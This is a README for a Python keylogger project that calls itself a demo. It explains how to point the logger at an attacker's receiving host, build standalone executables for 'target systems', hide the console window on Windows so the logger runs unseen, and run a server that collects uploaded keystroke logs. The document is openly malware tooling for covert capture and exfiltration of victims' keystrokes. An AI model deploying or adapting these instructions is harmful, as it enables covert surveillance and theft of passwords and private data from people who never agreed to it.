# Demo Python Keystroke Logging  

A very basic implementation of keystroke logging supporting log transfer between attacker and victim machines.     

## Installation

Use the package manager [pip](https://pip.pypa.io/en/stable/) to install requirements.

```bash
python3 -m pip install -r requirements.txt
```

Edit attacker/receiver host IP/Domain in main.py.

```python
sender = transport.Sender(remote="http://<IP>:<PORT>", logfile=logfile)

```
Start keylogger with:

```bash
python3 main.py
```

## Building Executables
 
Use [PyInstaller](https://pyinstaller.org/en/stable/installation.html) to build executables for target systems. Install with:

```bash
python3 -m pip install pyinstaller
```

With src directory as the root folder, build the executable (on linux-based or windows hosts) with:
```bash
pyinstaller --onefile main.py
```
or with:
```bash
python3 -m PyInstaller --onefile ./main.py
```

Specifically on windows hosts you can force the command prompt to stay in the background with:

```powershell
python -m PyInstaller --noconsole --onefile .\main.py
```

## Listening Server

In the server directory, start sample server with:
```bash
python3 server.py <PORT>
```
Note that a file upload POST request is received in sample intervals. Server is currently aimed for testing and logging and not for actually storing and managing received log files. 
